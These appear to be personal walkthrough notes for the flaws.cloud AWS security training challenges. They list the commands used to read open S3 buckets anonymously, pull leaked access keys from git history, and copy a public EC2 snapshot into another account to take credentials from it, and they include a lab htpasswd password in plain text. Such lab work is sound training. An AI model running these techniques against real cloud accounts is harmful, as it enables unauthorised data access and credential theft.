# flaws

## Challenge 1
```bash

nslookup flaws.cloud
nslookup 52.92.208.147
nslookup s3-website-us-west-2.amazonaws.com

Without creds:
aws s3 ls s3://flaws.cloud
with creds
aws s3 ls s3://flaws.cloud

aws help

aws s3 ls s3://flaws.cloud --no-sign-request

aws s3 cp s3://flaws.cloud/secret-dd02c7c.html . --no-sign-request


cat secret-dd02c7c.html
http://flaws.cloud/secret-dd02c7c.html - optional
```


## Challenge 2
```bash

nslookup
level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

Without credentils:
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request

With credentials: (configure the aws profile from the credentials of your own account)

aws configure --profile s3user
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile s3user
aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html . --profile s3user
ls
cat secret-e4443fc.html


```

## Challenge 3
```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --no-sign-request
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --profile s3user 

git diff
git log
apt search tig
apt install tig
git show <commit>

-access_key <REDACTED>         
-secret_access_key <REDACTED> 

http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud

f52ec03b227ea6094b04e43f475fb0126edb5a61

aws s3 --profile flaws-l3 ls



```

## Challenge 3
```bash
nslookup
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

aws ec2 describe-volumes --profile flaws-l3 --region us-west-2


aws ec2 describe-snapshots --snapshot-id snap-0f23409e560e2f059 --profile flaws-l3 --region us-west-2

aws sts get-caller-identity --profile flaws-l3



aws ec2 describe-snapshots --owner-id 975426262029 --profile flaws-l3 --region us-west-2



aws ec2 describe-instances --profile flaws-l3 --region us-west-2


aws ec2 describe-snapshots --snapshot-id snap-0b49342abd1bdcb89 --profile flaws-l3 --region us-west-2

1. aws --profile our-keys ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap0b49342abd1bdcb89
2.


Pacu

set_keys
whoami


cloudfox

./cloudfox aws buckets --profile flaws -v2 buckets


	
```

## Challenge 4
```

http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
Goal: Get credential
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/. 

Facts: It's running on EC2. 

Learning Object:
Learn EC2
Learn snapshot


## Get Account ID
aws sts get-caller-identity --profile flaws   


## 
aws ec2 describe-snapshots --owner-id 975426262029 --profile flaws

snap-0b49342abd1bdcb89

## get Instance-ID
aws --profile flaws  ec2 describe-instances 




##  Create a volume on my account
aws --profile YOUR_ACCOUNT ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89

Login to 

htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M

```

Level 5
```
http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
```

Level 6
```
aws s3 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud . --profile flaws5



```